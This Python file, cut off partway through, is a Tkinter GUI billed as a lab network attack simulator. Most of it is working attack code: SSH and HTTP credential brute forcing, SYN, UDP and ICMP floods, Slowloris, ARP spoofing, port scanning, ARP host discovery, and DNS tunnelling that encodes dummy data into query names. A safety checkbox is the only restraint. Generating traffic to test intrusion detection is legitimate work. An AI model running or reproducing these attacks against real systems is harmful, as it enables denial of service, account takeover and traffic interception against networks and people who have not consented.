"""
safe_attack_gui_realistic.py
Enhanced Tkinter GUI for realistic network attack simulation.
WITH SMART WINDOW POSITIONING for multi-window workflow.
Supports IPv4, IPv6, Interface Selection, Network Discovery & Reachability Check.
Requires: pip install scapy paramiko requests
Run as administrator on an isolated test network.
"""

import os
import threading
import time
from datetime import datetime
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
from scapy.all import (
    IP, IPv6, TCP, UDP, ARP,
    ICMP, ICMPv6EchoRequest,
    DNS, DNSQR,
    send, sr1, srp, Ether,
    conf, wrpcap, Raw,
    get_if_list, get_if_addr
)
import random
import string
import ipaddress
import socket
import base64

# Optional imports for realistic attacks
try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False
    print("⚠ Warning: paramiko not installed. SSH brute force will use basic mode.")
    print("   Install with: pip install paramiko")

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    print("⚠ Warning: requests not installed. HTTP brute force will use basic mode.")
    print("   Install with: pip install requests")

conf.verb = 0

PCAP_DIR = "pcaps"
os.makedirs(PCAP_DIR, exist_ok=True)

# Global variables
stop_event = threading.Event()
attack_running = False
available_interfaces = []
discovered_devices = []
ui_log = None

# ----------------------
# WINDOW POSITIONING FUNCTIONS (NEW)
# ----------------------

def snap_to_right_half():
    """Snap window to right half of screen"""
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    
    window_width = screen_width // 2
    window_height = screen_height - 80  # Leave space for taskbar
    x_position = screen_width // 2
    y_position = 0
    
    root.geometry(f"{window_width}x{window_height}+{x_position}+{y_position}")
    log("📐 Window positioned to RIGHT HALF", "info")

def snap_to_left_half():
    """Snap window to left half of screen"""
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    
    window_width = screen_width // 2
    window_height = screen_height - 80
    x_position = 0
    y_position = 0
    
    root.geometry(f"{window_width}x{window_height}+{x_position}+{y_position}")
    log("📐 Window positioned to LEFT HALF", "info")

def snap_to_top_half():
    """Snap window to top half of screen"""
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    
    window_width = screen_width - 20
    window_height = (screen_height - 80) // 2
    x_position = 10
    y_position = 0
    
    root.geometry(f"{window_width}x{window_height}+{x_position}+{y_position}")
    log("📐 Window positioned to TOP HALF", "info")

def snap_to_bottom_half():
    """Snap window to bottom half of screen"""
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    
    window_width = screen_width - 20
    window_height = (screen_height - 80) // 2
    x_position = 10
    y_position = (screen_height - 80) // 2 + 40
    
    root.geometry(f"{window_width}x{window_height}+{x_position}+{y_position}")
    log("📐 Window positioned to BOTTOM HALF", "info")

def maximize_window():
    """Maximize window"""
    root.state('zoomed')
    log("📐 Window MAXIMIZED", "info")

def center_window():
    """Center window on screen"""
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    
    window_width = 1250
    window_height = 800
    x_position = (screen_width - window_width) // 2
    y_position = (screen_height - window_height) // 2
    
    root.geometry(f"{window_width}x{window_height}+{x_position}+{y_position}")
    log("📐 Window CENTERED", "info")

def snap_to_top_right_quarter():
    """Snap to top-right quarter"""
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    
    window_width = screen_width // 2
    window_height = (screen_height - 80) // 2
    x_position = screen_width // 2
    y_position = 0
    
    root.geometry(f"{window_width}x{window_height}+{x_position}+{y_position}")
    log("📐 Window positioned to TOP-RIGHT QUARTER", "info")

def snap_to_bottom_right_quarter():
    """Snap to bottom-right quarter"""
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    
    window_width = screen_width // 2
    window_height = (screen_height - 80) // 2
    x_position = screen_width // 2
    y_position = (screen_height - 80) // 2 + 40
    
    root.geometry(f"{window_width}x{window_height}+{x_position}+{y_position}")
    log("📐 Window positioned to BOTTOM-RIGHT QUARTER", "info")

# ----------------------
# Network Discovery & Reachability
# ----------------------

def discover_all_interfaces_scapy():
    """Discover devices on ALL network interfaces using Scapy ARP scan"""
    log("🔍 Starting network discovery on ALL interfaces...", "info")
    devices = []
    scanned_networks = set()
    
    try:
        interfaces_to_scan = []
        for iface_data in available_interfaces:
            if iface_data['ip'] and iface_data['ip'] != '0.0.0.0' and iface_data['guid']:
                try:
                    network = ipaddress.IPv4Network(f"{iface_data['ip']}/24", strict=False)
                    network_str = str(network)
                    
                    if network_str not in scanned_networks:
                        interfaces_to_scan.append({
                            'name': iface_data['name'],
                            'ip': iface_data['ip'],
                            'network': network_str,
                            'guid': iface_data['guid']
                        })
                        scanned_networks.add(network_str)
                except Exception as e:
                    log(f"  ⚠ Could not parse network for {iface_data['name']}: {e}", "warning")
        
        if not interfaces_to_scan:
            log("❌ No valid interfaces found to scan", "error")
            return []
        
        log(f"📡 Scanning {len(interfaces_to_scan)} network(s)...", "info")
        
        for iface in interfaces_to_scan:
            try:
                log(f"  🌐 Scanning {iface['network']} on {iface['name']}...", "info")
                
                arp = ARP(pdst=iface['network'])
                ether = Ether(dst="ff:ff:ff:ff:ff:ff")
                packet = ether / arp
                
                try:
                    result = srp(packet, iface=iface['guid'], timeout=3, verbose=0)[0]
                except Exception:
                    log(f"    ⚠ Direct interface scan failed, trying default route...", "warning")
                    try:
                        result = srp(packet, timeout=3, verbose=0)[0]
                    except Exception as e2:
                        log(f"    ✗ Scan failed: {e2}", "error")
                        continue
                
                found_count = 0
                for sent, received in result:
                    devices.append({
                        'ip': received.psrc,
                        'mac': received.hwsrc,
                        'network': iface['network'],
                        'interface': iface['name']
                    })
                    log(f"    ✓ {received.psrc} ({received.hwsrc})", "success")
                    found_count += 1
                
                if found_count == 0:
                    log(f"    ⚠ No devices found on {iface['network']}", "warning")
                else:
                    log(f"  ✓ Found {found_count} device(s) on {iface['network']}", "success")
                
            except Exception as e:
                log(f"  ✗ Scan failed for {iface['network']}: {e}", "error")
        
        log(f"✅ Discovery complete: Found {len(devices)} device(s) total", "success")
        
    except Exception as e:
        log(f"❌ Discovery failed: {e}", "error")
    
    return devices

def check_target_reachability(target, iface=None):
    """Check if target is reachable using ICMP ping"""
    log(f"🔎 Checking reachability: {target}", "info")
    
    try:
        ipv6_mode = is_ipv6(target)
        
        if ipv6_mode:
            pkt = IPv6(dst=target)/ICMPv6EchoRequest()
        else:
            pkt = IP(dst=target)/ICMP()
        
        start_time = time.time()
        try:
            if iface:
                resp = sr1(pkt, iface=iface, timeout=2, verbose=0)
            else:
                resp = sr1(pkt, timeout=2, verbose=0)
        except:
            resp = sr1(pkt, timeout=2, verbose=0)
        
        if resp:
            latency = (time.time() - start_time) * 1000
            log(f"  ✓ Target is REACHABLE (latency: {latency:.2f}ms)", "success")
            return True, latency
        else:
            log(f"  ✗ Target is UNREACHABLE (no response)", "error")
            return False, None
            
    except Exception as e:
        log(f"  ✗ Reachability check failed: {e}", "error")
        return False, None

# ----------------------
# Interface Detection
# ----------------------

def get_network_interfaces():
    """Get list of available network interfaces"""
    interfaces = []
    
    try:
        try:
            from scapy.arch.windows import get_windows_if_list
            win_ifaces = get_windows_if_list()
            
            for iface in win_ifaces:
                try:
                    name = iface.get('name', iface.get('description', 'Network'))
                    if len(name) > 25:
                        name = name[:22] + "..."
                    
                    ips = iface.get('ips', [])
                    ip_addr = None
                    
                    for ip in ips:
                        ip_str = str(ip)
                        if '.' in ip_str and not ip_str.startswith('169.254') and not ip_str.startswith('0.0.0'):
                            ip_addr = ip_str
                            break
                    
                    guid = iface.get('guid', iface.get('name', ''))
                    
                    if ip_addr and guid:
                        interfaces.append({
                            'display': f"{name} ({ip_addr})",
                            'guid': guid,
                            'ip': ip_addr,
                            'name': name
                        })
                except:
                    continue
        except ImportError:
            pass
        
        if not interfaces:
            iface_list = get_if_list()
            
            for iface in iface_list:
                try:
                    addr = get_if_addr(iface)
                    
                    if addr and addr != "0.0.0.0" and not addr.startswith('169.254'):
                        if 'NPF_' in iface or 'DeviceNPF' in iface:
                            parts = iface.replace('\\Device\\NPF_', '').replace('{', '').replace('}', '')
                            if len(parts) > 8:
                                display_name = f"Adapter-{parts[:8]}"
                            else:
                                display_name = "Network Adapter"
                        elif '\\' in iface:
                            display_name = iface.split('\\')[-1][:20]
                        else:
                            display_name = iface[:20] if len(iface) > 20 else iface
                        
                        interfaces.append({
                            'display': f"{display_name} ({addr})",
                            'guid': iface,
                            'ip': addr,
                            'name': display_name
                        })
                except:
                    continue
        
    except Exception as e:
        pass
    
    interfaces.insert(0, {
        'display': 'Auto (Default)',
        'guid': None,
        'ip': None,
        'name': 'Auto'
    })
    
    return interfaces

def get_selected_interface():
    """Extract interface GUID from dropdown selection"""
    selection = interface_var.get()
    
    if not selection or selection == "Auto (Default)":
        return None
    
    for iface in available_interfaces:
        if iface['display'] == selection:
            return iface['guid']
    
    return None

# ----------------------
# Helper Functions
# ----------------------

def is_ipv6(address):
    """Check if address is IPv6"""
    return ":" in address

def create_ip_layer(dst):
    """Create appropriate IP layer"""
    if is_ipv6(dst):
        return IPv6(dst=dst)
    else:
        return IP(dst=dst)

def timestamp():
    return datetime.now().strftime("%Y%m%d_%H%M%S")

def save_pcap(pkts, scenario_label):
    """Optional PCAP saving"""
    if not save_pcap_var.get():
        return
    fname = f"{PCAP_DIR}/{scenario_label}_{timestamp()}.pcap"
    try:
        wrpcap(fname, pkts)
        log(f"✓ PCAP saved: {fname}", "success")
    except Exception as e:
        log(f"✗ Failed to save pcap: {e}", "error")

def log(msg, level="info"):
    """Log message to UI"""
    global ui_log
    if ui_log is None:
        print(f"[LOG] {msg}")
        return
    
    now = datetime.now().strftime("%H:%M:%S")
    ui_log.configure(state="normal")
    
    if level == "error":
        tag = "error"
    elif level == "success":
        tag = "success"
    elif level == "warning":
        tag = "warning"
    else:
        tag = "info"
    
    ui_log.insert(tk.END, f"[{now}] {msg}\n", tag)
    ui_log.see(tk.END)
    ui_log.configure(state="disabled")

def safe_run(fn):
    t = threading.Thread(target=fn, daemon=True)
    t.start()

def require_safety(func):
    def wrapper(*args, **kwargs):
        if not safety_var.get():
            messagebox.showwarning("Safety", "⚠ Enable the safety confirmation toggle first.\nRun only in isolated lab environment.")
            return
        return func(*args, **kwargs)
    return wrapper

def update_attack_status(running):
    """Update UI based on attack status"""
    global attack_running
    attack_running = running
    if running:
        stop_button.config(state="normal")
        status_label.config(text="🔴 Attack Running", foreground=ERROR_COLOR)
    else:
        stop_button.config(state="disabled")
        status_label.config(text="🟢 Ready", foreground=SUCCESS_COLOR)

def stop_attack():
    """Stop the running attack"""
    stop_event.set()
    log("🛑 Stop signal sent - waiting for attack to terminate...", "warning")

# ----------------------
# REALISTIC ATTACK IMPLEMENTATIONS
# ----------------------

def port_scan_impl(target, ports_list, delay, duration, label):
    """Port Scanning with proper SYN-ACK-RST"""
    try:
        ports = [int(p.strip()) for p in ports_list.split(",") if p.strip()]
    except:
        log("Invalid ports format.", "error")
        update_attack_status(False)
        return
    
    iface = get_selected_interface()
    reachable, _ = check_target_reachability(target, iface)
    if not reachable:
        log("⚠ Target unreachable - continuing anyway...", "warning")
    
    pkts = []
    open_ports = []
    update_attack_status(True)
    ip_version = "IPv6" if is_ipv6(target) else "IPv4"
    iface_name = "Default" if not iface else interface_var.get().split(' (')[0]
    log(f"🔍 Port Scan ({ip_version}) -> {target} via {iface_name} | Ports: {ports}")
    
    start_time = time.time()
    random.shuffle(ports)  # Randomize for stealth
    
    for p in ports:
        if stop_event.is_set() or (time.time() - start_time) > duration:
            break
        
        pkt = create_ip_layer(target)/TCP(dport=p, flags="S")
        pkts.append(pkt)
        try:
            if iface:
                try:
                    send(pkt, iface=iface, verbose=0)
                    resp = sr1(pkt, iface=iface, timeout=1, verbose=0)
                except:
                    send(pkt, verbose=0)
                    resp = sr1(pkt, timeout=1, verbose=0)
            else:
                send(pkt, verbose=0)
                resp = sr1(pkt, timeout=1, verbose=0)
            
            if resp is None:
                log(f"  Port {p}: Filtered/Closed")
            elif resp.haslayer(TCP) and resp[TCP].flags & 0x12:
                open_ports.append(p)
                log(f"  Port {p}: OPEN", "success")
                # Send RST to close connection
                try:
                    rst = create_ip_layer(target)/TCP(dport=p, flags="R")
                    if iface:
                        send(rst, iface=iface, verbose=0)
                    else:
                        send(rst, verbose=0)
                except:
                    pass
            else:
                log(f"  Port {p}: Closed")
        except Exception as e:
            log(f"  Port {p} error: {e}", "error")
        time.sleep(delay)
    
    save_pcap(pkts, label)
    stop_event.clear()
    update_attack_status(False)
    log(f"✓ Port scan completed: {len(open_ports)} open ports found", "success")

def ssh_brute_force_impl(target, port, usernames, passwords, delay, duration, label):
    """REALISTIC SSH brute force with actual authentication attempts"""
    if not HAS_PARAMIKO:
        log("⚠ Paramiko not installed. Using basic TCP simulation.", "warning")
        return brute_force_basic_impl(target, port, len(usernames) * len(passwords), delay, duration, label)
    
    update_attack_status(True)
    log(f"🔐 SSH Brute Force -> {target}:{port}")
    
    start_time = time.time()
    total_attempts = 0
    
    for username in usernames:
        if stop_event.is_set() or (time.time() - start_time) >= duration:
            break
        
        for password in passwords:
            if stop_event.is_set() or (time.time() - start_time) >= duration:
                break
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            try:
                ssh.connect(target, port=port, username=username,
                           password=password, timeout=3,
                           allow_agent=False, look_for_keys=False)
                log(f"  ✓ SUCCESS: {username}:{password}", "success")
                ssh.close()
                break  # Stop on success
            except paramiko.AuthenticationException:
                log(f"  ✗ Failed: {username}:{password}")
                total_attempts += 1
            except Exception as e:
                log(f"  Error: {e}", "error")
            finally:
                try:
                    ssh.close()
                except:
                    pass
            
            time.sleep(delay)
    
    stop_event.clear()
    update_attack_status(False)
    log(f"✓ SSH Brute Force completed: {total_attempts} attempts", "success")

def http_brute_force_impl(target, port, login_path, usernames, passwords, delay, duration, label):
    """REALISTIC HTTP brute force with actual POST requests"""
    if not HAS_REQUESTS:
        log("⚠ Requests not installed. Using basic TCP simulation.", "warning")
        return brute_force_basic_impl(target, port, len(usernames) * len(passwords), delay, duration, label)
    
    update_attack_status(True)
    protocol = "https" if port == 443 else "http"
    url = f"{protocol}://{target}:{port}{login_path}"
    log(f"🌐 HTTP Brute Force -> {url}")
    
    start_time = time.time()
    total_attempts = 0
    
    for username in usernames:
        if stop_event.is_set() or (time.time() - start_time) >= duration:
            break
        
        for password in passwords:
            if stop_event.is_set() or (time.time() - start_time) >= duration:
                break
            
            data = {"username": username, "password": password}
            try:
                resp = requests.post(url, data=data, timeout=5, verify=False)
                if resp.status_code == 200 and "success" in resp.text.lower():
                    log(f"  ✓ SUCCESS: {username}:{password} (HTTP {resp.status_code})", "success")
                elif resp.status_code in [401, 403]:
                    log(f"  ✗ Failed: {username}:{password} (HTTP {resp.status_code})")
                else:
                    log(f"  ? Unknown: {username}:{password} (HTTP {resp.status_code})")
                total_attempts += 1
            except Exception as e:
                log(f"  Error: {e}", "error")
            
            time.sleep(delay)
    
    stop_event.clear()
    update_attack_status(False)
    log(f"✓ HTTP Brute Force completed: {total_attempts} attempts", "success")

def brute_force_basic_impl(target, port, num_attempts, delay, duration, label):
    """Basic brute force simulation using TCP SYN (fallback)"""
    iface = get_selected_interface()
    pkts = []
    update_attack_status(True)
    log(f"🔐 Brute Force (Basic TCP) -> {target}:{port} | {num_attempts} attempts")
    
    start_time = time.time()
    attempts = 0
    
    while not stop_event.is_set() and attempts < num_attempts and (time.time() - start_time) < duration:
        pkt = create_ip_layer(target)/TCP(dport=port, flags="S")
        pkts.append(pkt)
        try:
            if iface:
                send(pkt, iface=iface, verbose=0)
            else:
                send(pkt, verbose=0)
            attempts += 1
            if attempts % 10 == 0:
                log(f"  Sent {attempts}/{num_attempts} attempts")
        except Exception as e:
            log(f"  Error: {e}", "error")
        time.sleep(delay)
    
    save_pcap(pkts, label)
    stop_event.clear()
    update_attack_status(False)
    log(f"✓ Brute Force completed: {attempts} attempts", "success")

def slowloris_impl(target, port, connections, duration, label):
    """REALISTIC Slowloris with persistent partial HTTP headers"""
    update_attack_status(True)
    log(f"🐌 Slowloris -> {target}:{port} | {connections} connections")
    
    sockets_list = []
    
    # Phase 1: Open connections with partial HTTP headers
    for i in range(connections):
        if stop_event.is_set():
            break
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target, port))
            
            # Send partial HTTP header
            sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {target}\r\n".encode())
            sock.send(f"User-Agent: Mozilla/5.0\r\n".encode())
            
            sockets_list.append(sock)
            if (i + 1) % 10 == 0:
                log(f"  Connection {i+1}/{connections} established")
        except Exception as e:
            log(f"  Connection {i+1} failed: {e}", "error")
        
        time.sleep(0.05)
    
    log(f"✓ Established {len(sockets_list)} connections", "success")
    
    # Phase 2: Keep connections alive with periodic headers
    start_time = time.time()
    keep_alive_count = 0
    
    while not stop_event.is_set() and (time.time() - start_time) < duration:
        for sock in sockets_list[:]:
            try:
                # Send incomplete header to keep connection alive
                sock.send(f"X-{random.choice(string.ascii_lowercase)}: {random.randint(1, 5000)}\r\n".encode())
            except:
                sockets_list.remove(sock)
        
        keep_alive_count += 1
        if keep_alive_count % 5 == 0:
            log(f"  {len(sockets_list)} connections alive (cycle: {keep_alive_count})")
        
        time.sleep(10)  # Send keep-alive every 10 seconds
    
    # Cleanup
    for sock in sockets_list:
        try:
            sock.close()
        except:
            pass
    
    stop_event.clear()
    update_attack_status(False)
    log(f"✓ Slowloris completed: Maintained connections for {int(time.time() - start_time)}s", "success")

def arp_spoof_impl(target_ip, fake_mac, intensity, duration, label):
    """ARP Spoofing with continuous gratuitous ARPs"""
    if is_ipv6(target_ip):
        log("❌ ARP not supported for IPv6", "error")
        update_attack_status(False)
        return
    
    iface = get_selected_interface()
    pkts = []
    update_attack_status(True)
    iface_name = "Default" if not iface else interface_var.get().split(' (')[0]
    log(f"🎭 ARP Spoofing -> {target_ip} via {iface_name}")
    
    start_time = time.time()
    total_sent = 0
    
    while not stop_event.is_set() and (time.time() - start_time) < duration:
        for i in range(intensity):
            if stop_event.is_set():
                break
            pkt = ARP(op=2, psrc=target_ip, hwsrc=fake_mac, pdst=target_ip)
            pkts.append(pkt)
            try:
                if iface:
                    try:
                        send(pkt, iface=iface, verbose=0)
                    except:
                        send(pkt, verbose=0)
                else:
                    send(pkt, verbose=0)
                total_sent += 1
            except Exception as e:
                log(f"Error: {e}", "error")
        
        if total_sent % 20 == 0:
            log(f"  Sent {total_sent} ARP packets...")
        time.sleep(0.5)
    
    save_pcap(pkts, label)
    stop_event.clear()
    update_attack_status(False)
    log(f"✓ ARP Spoofing completed: {total_sent} packets", "success")

def dns_tunnel_impl(target, domain, queries_per_sec, duration, label):
    """REALISTIC DNS tunneling with encoded data and varied record types"""
    iface = get_selected_interface()
    reachable, _ = check_target_reachability(target, iface)
    if not reachable:
        log("⚠ Target unreachable - continuing anyway...", "warning")
    
    pkts = []
    update_attack_status(True)
    ip_version = "IPv6" if is_ipv6(target) else "IPv4"
    iface_name = "Default" if not iface else interface_var.get().split(' (')[0]
    log(f"🌐 DNS Tunneling ({ip_version}) -> {target} via {iface_name} | Domain: {domain}")
    
    start_time = time.time()
    total_queries = 0
    
    # Simulate data exfiltration
    fake_data = "SensitiveData123ExfilPayload" * 20
    
    while not stop_event.is_set() and (time.time() - start_time) < duration:
        # Encode chunk as subdomain
        chunk_start = (total_queries * 32) % len(fake_data)
        chunk = fake_data[chunk_start:chunk_start + 32]
        encoded = base64.b32encode(chunk.encode()).decode().lower().rstrip('=')
        
        # Add random padding for entropy
        padding = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        tunnel_domain = f"{encoded}{padding}.{domain}"
        
        # Alternate between A, TXT, NULL, and CNAME queries
        qtype = random.choice(['A', 'TXT', 'NULL', 'CNAME'])
        qtype_val = {'A': 1, 'TXT': 16, 'NULL': 10, 'CNAME': 5}[qtype]
        
        pkt = create_ip_layer(target)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=tunnel_domain, qtype=qtype_val))
        pkts.append(pkt)
        
        try:
            if iface:
                try:
                    send(pkt, iface=iface, verbose=0)
                except:
                    send(pkt, verbose=0)
            else:
                send(pkt, verbose=0)
            total_queries += 1
            
            if total_queries % 50 == 0:
                log(f"  Sent {total_queries} queries (Type: {qtype})")
        except Exception as e:
            log(f"  Error: {e}", "error")
        
        time.sleep(1.0 / queries_per_sec)
    
    save_pcap(pkts, label)
    stop_event.clear()
    update_attack_status(False)
    log(f"✓ DNS Tunneling completed: {total_queries} queries with base64-encoded data", "success")

def syn_flood_impl(target, port, intensity, delay, duration, label):
    """SYN Flood Attack"""
    iface = get_selected_interface()
    reachable, _ = check_target_reachability(target, iface)
    if not reachable:
        log("⚠ Target unreachable - continuing anyway...", "warning")
    
    pkts = []
    update_attack_status(True)
    ip_version = "IPv6" if is_ipv6(target) else "IPv4"
    iface_name = "Default" if not iface else interface_var.get().split(' (')[0]
    log(f"⚡ SYN Flood ({ip_version}) -> {target}:{port} via {iface_name} | Intensity: {intensity}")
    
    start_time = time.time()
    total_sent = 0
    
    while not stop_event.is_set() and (time.time() - start_time) < duration:
        for i in range(intensity):
            if stop_event.is_set():
                break
            src_port = random.randint(1024, 65535)
            pkt = create_ip_layer(target)/TCP(sport=src_port, dport=port, flags="S", seq=random.randint(1000, 9000))
            pkts.append(pkt)
            try:
                if iface:
                    try:
                        send(pkt, iface=iface, verbose=0)
                    except:
                        send(pkt, verbose=0)
                else:
                    send(pkt, verbose=0)
                total_sent += 1
            except Exception as e:
                log(f"Error: {e}", "error")
        
        if total_sent % 50 == 0:
            log(f"  Sent {total_sent} packets...")
        time.sleep(delay)
    
    save_pcap(pkts, label)
    stop_event.clear()
    update_attack_status(False)
    log(f"✓ SYN Flood completed: {total_sent} packets", "success")

def udp_flood_impl(target, port, intensity, delay, duration, label):
    """UDP Flood Attack"""
    iface = get_selected_interface()
    reachable, _ = check_target_reachability(target, iface)
    if not reachable:
        log("⚠ Target unreachable - continuing anyway...", "warning")
    
    pkts = []
    update_attack_status(True)
    ip_version = "IPv6" if is_ipv6(target) else "IPv4"
    iface_name = "Default" if not iface else interface_var.get().split(' (')[0]
    log(f"💥 UDP Flood ({ip_version}) -> {target}:{port} via {iface_name}")
    
    start_time = time.time()
    total_sent = 0
    
    while not stop_event.is_set() and (time.time() - start_time) < duration:
        for i in range(intensity):
            if stop_event.is_set():
                break
            payload = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(512, 1024)))
            pkt = create_ip_layer(target)/UDP(dport=port)/Raw(load=payload)
            pkts.append(pkt)
            try:
                if iface:
                    try:
                        send(pkt, iface=iface, verbose=0)
                    except:
                        send(pkt, verbose=0)
                else:
                    send(pkt, verbose=0)
                total_sent += 1
            except Exception as e:
                log(f"Error: {e}", "error")
        
        if total_sent % 50 == 0:
            log(f"  Sent {total_sent} packets...")
        time.sleep(delay)
    
    save_pcap(pkts, label)
    stop_event.clear()
    update_attack_status(False)
    log(f"✓ UDP Flood completed: {total_sent} packets", "success")

def icmp_flood_impl(target, intensity, delay, duration, label):
    """ICMP Flood Attack"""
    iface = get_selected_interface()
    reachable, _ = check_target_reachability(target, iface)
    if not reachable:
        log("⚠ Target unreachable - continuing anyway...", "warning")
    
    pkts = []
    update_attack_status(True)
    ipv6_mode = is_ipv6(target)
    protocol = "ICMPv6" if ipv6_mode else "ICMP"
    iface_name = "Default" if not iface else interface_var.get().split(' (')[0]
    log(f"📡 {protocol} Flood -> {target} via {iface_name} | Intensity: {intensity}")
    
    start_time = time.time()
    total_sent = 0
    
    while not stop_event.is_set() and (time.time() - start_time) < duration:
        for i in range(intensity):
            if stop_event.is_set():
                break
            payload = ''.join(random.choices(string.ascii_letters, k=56))
            if ipv6_mode:
                pkt = IPv6(dst=target)/ICMPv6EchoRequest()/Raw(load=payload)
            else:
                pkt = IP(dst=target)/ICMP()/Raw(load=payload)
            pkts.append(pkt)
            try:
                if iface:
                    try:
                        send(pkt, iface=iface, verbose=0)
                    except:
                        send(pkt, verbose=0)
                else:
                    send(pkt, verbose=0)
                total_sent += 1
            except Exception as e:
                log(f"Error: {e}", "error")
        
        if total_sent % 100 == 0:
            log(f"  Sent {total_sent} packets...")
        time.sleep(delay)
    
    save_pcap(pkts, label)
    stop_event.clear()
    update_attack_status(False)
    log(f"✓ {protocol} Flood completed: {total_sent} packets", "success")

# ----------------------
# GUI callbacks
# ----------------------

def scan_network_gui():
    """GUI callback for network scan"""
    if attack_running:
        messagebox.showwarning("Busy", "Wait for current attack to complete.")
        return
    
    def scan_thread():
        global discovered_devices
        discovered_devices = discover_all_interfaces_scapy()
        
        if discovered_devices:
            result_text = f"Found {len(discovered_devices)} device(s):\n\n"
            result_text += f"{'IP':<15} {'MAC':<17} {'Network':<18} {'Interface'}\n"
            result_text += "-" * 75 + "\n"
            
            for dev in discovered_devices:
                result_text += f"{dev['ip']:<15} {dev['mac']:<17} {dev['network']:<18} {dev['interface']}\n"
            
            messagebox.showinfo("Network Discovery", result_text)
        else:
            messagebox.showinfo("Network Discovery", 
                              "No devices found.\n\nCheck:\n- Firewall settings\n- Administrator rights\n- Network connectivity")
    
    safe_run(scan_thread)

def check_target_gui():
    """GUI callback for target reachability check"""
    if attack_running:
        messagebox.showwarning("Busy", "Wait for current attack to complete.")
        return
    
    target = target_var.get().strip()
    if not target:
        messagebox.showwarning("No Target", "Please enter a target IP address.")
        return
    
    iface = get_selected_interface()
    
    def check_thread():
        reachable, latency = check_target_reachability(target, iface)
        if reachable:
            messagebox.showinfo("Reachability Check", 
                              f"✓ Target {target} is REACHABLE\nLatency: {latency:.2f}ms")
        else:
            messagebox.showwarning("Reachability Check", 
                                 f"✗ Target {target} is UNREACHABLE")
    
    safe_run(check_thread)

@require_safety
def run_port_scan():
    if attack_running:
        messagebox.showwarning("Attack Running", "Stop current attack first.")
        return
    tgt = target_var.get().strip()
    ports = ports_var.get().strip()
    delay = float(scan_delay_var.get())
    duration = int(attack_duration_var.get())
    label = f"{label_var.get().strip()}_port_scan"
    safe_run(lambda: port_scan_impl(tgt, ports, delay, duration, label))

@require_safety
def run_ssh_brute():
    if attack_running:
        messagebox.showwarning("Attack Running", "Stop current attack first.")
        return
    tgt = target_var.get().strip()
    port = int(brute_port_var.get())
    users = [u.strip() for u in brute_users_var.get().split(',')]
    passwords = [p.strip() for p in brute_pass_var.get().split(',')]
    delay = float(brute_delay_var.get())
    duration = int(attack_duration_var.get())
    label = f"{label_var.get().strip()}_ssh_brute"
    safe_run(lambda: ssh_brute_force_impl(tgt, port, users, passwords, delay, duration, label))

@require_safety
def run_slowloris():
    if attack_running:
        messagebox.showwarning("Attack Running", "Stop current attack first.")
        return
    tgt = target_var.get().strip()
    port = int(slow_port_var.get())
    conn = int(slow_conn_var.get())
    duration = int(attack_duration_var.get())
    label = f"{label_var.get().strip()}_slowloris"
    safe_run(lambda: slowloris_impl(tgt, port, conn, duration, label))

@require_safety
def run_arp():
    if attack_running:
        messagebox.showwarning("Attack Running", "Stop current attack first.")
        return
    tgt = arp_ip_var.get().strip()
    mac = arp_mac_var.get().strip()
    intensity = int(attack_intensity_var.get())
    duration = int(attack_duration_var.get())
    label = f"{label_var.get().strip()}_arp_spoof"
    safe_run(lambda: arp_spoof_impl(tgt, mac, intensity, duration, label))

@require_safety
def run_dns_tunnel():
    if attack_running:
        messagebox.showwarning("Attack Running", "Stop current attack first.")
        return
    tgt = dns_server_var.get().strip()
    domain = dns_domain_var.get().strip()
    rate = int(attack_intensity_var.get())
    duration = int(attack_duration_var.get())
    label = f"{label_var.get().strip()}_dns_tunnel"
    safe_run(lambda: dns_tunnel_impl(tgt, domain, rate, duration, label))

@require_safety
def run_syn_flood():
    if attack_running:
        messagebox.showwarning("Attack Running", "Stop current attack first.")
        return
    tgt = target_var.get().strip()
    port = int(syn_port_var.get())
    intensity = int(attack_intensity_var.get())
    delay = float(syn_delay_var.get())
    duration = int(attack_duration_var.get())
    label = f"{label_var.get().strip()}_syn_flood"
    safe_run(lambda: syn_flood_impl(tgt, port, intensity, delay, duration, label))

@require_safety
def run_udp_flood():
    if attack_running:
        messagebox.showwarning("Attack Running", "Stop current attack first.")
        return
    tgt = target_var.get().strip()
    port = int(udp_port_var.get())
    intensity = int(attack_intensity_var.get())
    delay = float(udp_delay_var.get())
    duration = int(attack_duration_var.get())
    label = f"{label_var.get().strip()}_udp_flood"
    safe_run(lambda: udp_flood_impl(tgt, port, intensity, delay, duration, label))

@require_safety
def run_icmp_flood():
    if attack_running:
        messagebox.showwarning("Attack Running", "Stop current attack first.")
        return
    tgt = target_var.get().strip()
    intensity = int(attack_intensity_var.get())
    delay = float(icmp_delay_var.get())
    duration = int(attack_duration_var.get())
    label = f"{label_var.get().strip()}_icmp_ddos"
    safe_run(lambda: icmp_flood_impl(tgt, intensity, delay, duration, label))

def refresh_interfaces():
    global available_interfaces
    log("🔄 Refreshing interfaces...", "info")
    available_interfaces = get_network_interfaces()
    interface_combo['values'] = [iface['display'] for iface in available_interfaces]
    if available_interfaces:
        interface_var.set(available_interfaces[0]['display'])
    log(f"✓ Found {len(available_interfaces)} interface(s)", "success")

def open_pcap_folder():
    path = os.path.abspath(PCAP_DIR)
    log(f"📁 Opening: {path}")
    try:
        if os.name == "nt":
            os.startfile(path)
        else:
            os.system(f"xdg-open {path} &")
    except Exception as e:
        log(f"Error: {e}", "error")

# ----------------------
# Build UI WITH POSITIONING MENU
# ----------------------
root = tk.Tk()
root.title("Network Attack Simulator - Multi-Window Layout")

# Position to RIGHT HALF by default (for Chrome on left)
